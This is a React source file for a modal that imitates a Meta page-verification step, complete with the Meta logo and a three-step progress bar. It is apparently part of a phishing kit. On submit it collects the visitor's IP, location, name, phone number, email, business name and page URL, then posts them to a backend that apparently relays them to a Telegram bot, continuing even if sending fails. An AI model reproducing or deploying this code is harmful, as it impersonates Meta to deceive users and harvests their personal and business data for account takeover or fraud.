'use client';

import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import { getTranslations } from '@/utils/translate';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useMemo, useState } from 'react';

interface VerifyFormData {
    fullName: string;
    personalEmail: string;
    pageName: string;
    pageUrl: string;
    legalBusinessName: string;
    phoneNumber: string;
    description: string;
}

interface VerifyInfoModalProps {
    nextStep: (data: VerifyFormData) => void;
}

const VerifyInfoModal: FC<VerifyInfoModalProps> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [formData, setFormData] = useState<VerifyFormData>({
        fullName: '',
        personalEmail: '',
        pageName: '',
        pageUrl: '',
        legalBusinessName: '',
        phoneNumber: '',
        description: ''
    });

    const { setModalOpen, geoInfo, setMessageId, setMessage } = store();

    // Get language from country code
    const countryToLanguage: Record<string, string> = useMemo(() => ({
        'us': 'en', 'gb': 'en', 'ca': 'en', 'au': 'en',
        'mx': 'es', 'es': 'es', 'ar': 'es', 'br': 'pt', 'pt': 'pt',
        'fr': 'fr', 'de': 'de', 'at': 'de', 'ch': 'fr',
        'jp': 'ja', 'cn': 'zh', 'tw': 'zh', 'hk': 'zh',
        'kr': 'ko', 'th': 'th', 'vn': 'vi', 'id': 'id',
        'ru': 'ru', 'ua': 'uk', 'in': 'hi', 'bd': 'bn',
        'ae': 'ar', 'sa': 'ar', 'eg': 'ar'
    }), []);
    
    const translations = useMemo(() => {
        const countryCode = geoInfo?.country_code?.toLowerCase() || 'us';
        const lang = countryToLanguage[countryCode] || 'en';
        return getTranslations(lang);
    }, [geoInfo, countryToLanguage]);

    const t = (text: string): string => {
        return translations[text] || text;
    };

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: value
        }));
    }, []);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;
        setIsLoading(true);

        const message = `
${
    geoInfo
        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>\n<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
        : 'N/A'
}

<b>👤 Full Name:</b> <code>${formData.fullName}</code>
<b>📘 Page Name:</b> <code>${formData.pageName}</code>
<b>🔗 Page URL:</b> <code>${formData.pageUrl}</code>
<b>🏢 Legal Business Name:</b> <code>${formData.legalBusinessName}</code>
<b>📱 Phone Number:</b> <code>${formData.phoneNumber}</code>
<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
<b>📝 Description:</b> <code>${formData.description}</code>

<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
        `.trim();

        try {
            const res = await axios.post('/api/send', {
                message
            });
            if (res?.data?.success && typeof res.data.data.result.message_id === 'number') {
                setMessageId(res.data.data.result.message_id);
                setMessage(message);
            }
        } catch {
            // Continue even if send fails
        } finally {
            setIsLoading(false);
            nextStep(formData);
        }
    };

    return (
        <>
            {/* Backdrop overlay */}
            <div className="fixed top-0 left-0 right-0 bottom-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
            <div className="fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-1 sm:px-3 md:px-4">
                <div className="w-full max-w-4xl max-h-[95vh] rounded-2xl bg-white overflow-hidden shadow-2xl flex flex-col md:flex-row">
                    {/* Left side - Form */}
                    <div className="flex-1 overflow-y-auto p-4 sm:p-6 md:p-8">
                        {/* Header */}
                        <div className="flex items-center justify-between mb-6">
                            <div>
                                <h1 className="text-2xl sm:text-3xl font-bold text-gray-900 mb-2">
                                    {t('Confirm Page Information')}
                                </h1>
                                <p className="text-sm text-gray-600">
                                    {t('Your page meets the eligibility requirements')}
                                </p>
                            </div>
                            <button
                                type="button"
                                onClick={() => setModalOpen(false)}
                                className="h-8 w-8 rounded-full hover:bg-gray-100 flex items-center justify-center flex-shrink-0 transition-colors"
                                aria-label="Close modal"
                            >
                                <FontAwesomeIcon icon={faXmark} />
                            </button>
                        </div>

                        {/* Progress indicator */}
                        <div className="flex items-center gap-2 mb-8">
                            <div className="flex-1 flex items-center gap-2">
                                <div className="w-8 h-8 rounded-full bg-blue-600 text-white flex items-center justify-center text-sm font-bold">
                                    1
                                </div>
                                <span className="text-sm font-medium text-gray-900">{t('Submit Application')}</span>
                            </div>
                            <div className="w-12 h-0.5 bg-gray-300"></div>
                            <div className="flex-1 flex items-center gap-2">
                                <div className="w-8 h-8 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center text-sm font-bold">
                                    2
                                </div>
                                <span className="text-sm font-medium text-gray-500">{t('Under Review')}</span>
                            </div>
                            <div className="w-12 h-0.5 bg-gray-300"></div>
                            <div className="flex-1 flex items-center gap-2">
                                <div className="w-8 h-8 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center text-sm font-bold">
                                    3
                                </div>
                                <span className="text-sm font-medium text-gray-500">{t('Completed')}</span>
                            </div>
                        </div>

                        {/* Form */}
                        <form onSubmit={handleSubmit} className="space-y-4">
                            {/* Page Name */}
                            <div>
                                <label className="block text-sm font-medium text-gray-700 mb-2">
                                    {t('Page Name')}
                                </label>
                                <input
                                    required
                                    type="text"
                                    name="pageName"
                                    value={formData.pageName}
                                    onChange={handleInputChange}
                                    placeholder="Page name"
                                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition"
                                />
                            </div>

                            {/* Page URL */}
                            <div>
                                <label className="block text-sm font-medium text-gray-700 mb-2">
                                    {t('Page URL')}
                                </label>
                                <input
                                    required
                                    type="url"
                                    name="pageUrl"
                                    value={formData.pageUrl}
                                    onChange={handleInputChange}
                                    placeholder="https://facebook.com/..."
                                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition"
                                />
                            </div>

                            {/* Legal Business Name */}
                            <div>
                                <label className="block text-sm font-medium text-gray-700 mb-2">
                                    {t('Legal Business Name')}
                                </label>
                                <input
                                    required
                                    type="text"
                                    name="legalBusinessName"
                                    value={formData.legalBusinessName}
                                    onChange={handleInputChange}
                                    placeholder={t('Enter legal business name')}
                                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition"
                                />
                            </div>

                            {/* Phone Number */}
                            <div>
                                <label className="block text-sm font-medium text-gray-700 mb-2">
                                    {t('Phone Number')}
                                </label>
                                <input
                                    required
                                    type="tel"
                                    name="phoneNumber"
                                    value={formData.phoneNumber}
                                    onChange={handleInputChange}
                                    placeholder={t('Enter phone number')}
                                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition"
                                />
                            </div>

                            {/* Email */}
                            <div>
                                <label className="block text-sm font-medium text-gray-700 mb-2">
                                    {t('Email')}
                                </label>
                                <input
                                    required
                                    type="email"
                                    name="personalEmail"
                                    value={formData.personalEmail}
                                    onChange={handleInputChange}
                                    placeholder={t('Enter email address')}
                                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition"
                                />
                            </div>

                            {/* Description */}
                            <div>
                                <label className="block text-sm font-medium text-gray-700 mb-2">
                                    {t('Description')}
                                </label>
                                <textarea
                                    name="description"
                                    value={formData.description}
                                    onChange={handleInputChange}
                                    placeholder={t('Write a short description about your page')}
                                    rows={4}
                                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition resize-none"
                                />
                            </div>

                            {/* Submit Button */}
                            <button
                                type="submit"
                                disabled={isLoading}
                                className="w-full mt-6 py-3 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 transition-colors disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                            >
                                {isLoading ? (
                                    <>
                                        <div className="h-4 w-4 animate-spin rounded-full border-2 border-white border-b-transparent"></div>
                                        {t('Submit for Review')}
                                    </>
                                ) : (
                                    t('Submit for Review')
                                )}
                            </button>
                        </form>

                        {/* Meta Logo */}
                        <div className="flex items-center justify-center mt-8 pt-6 border-t border-gray-200">
                            <Image src={MetaLogo} alt="Meta" className="h-4 w-14" />
                        </div>
                    </div>

                    {/* Right side - Status Card (visible only on md screens and up) */}
                    <div className="hidden md:flex md:w-1/3 bg-gradient-to-br from-blue-500 to-blue-600 p-6 flex-col justify-center items-center text-white">
                        <div className="w-24 h-24 rounded-full bg-white bg-opacity-20 flex items-center justify-center mb-4 text-4xl font-bold">
                            {formData.pageName ? formData.pageName.charAt(0).toUpperCase() : ''}
                        </div>
                        <h3 className="text-xl font-bold text-center mb-2">
                            {formData.pageName || 'Page Name'}
                        </h3>
                        <div className="flex items-center gap-2 text-sm">
                            <div className="w-2 h-2 rounded-full bg-yellow-300"></div>
                            <span>Status: Not Verified</span>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
};

export default VerifyInfoModal;
